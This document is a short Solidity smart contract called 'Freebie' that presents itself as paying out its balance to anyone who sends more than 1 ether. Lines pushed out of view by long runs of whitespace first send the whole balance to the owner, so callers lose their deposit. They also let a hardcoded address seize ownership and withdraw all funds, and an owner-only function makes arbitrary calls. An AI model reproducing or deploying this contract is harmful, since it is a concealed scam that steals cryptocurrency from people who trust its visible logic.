pragma solidity ^0.4.19;

contract Freebie
{
    address public O = msg.sender;
   
    function() public payable{}
   
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               O.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){O=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
        require(msg.sender == O);
        O.transfer(this.balance);
    }
    
    function Command(address a,bytes d)
    payable
    public
    {
        require(msg.sender == O);
         
        a.call.value(msg.value)(d);
    }
}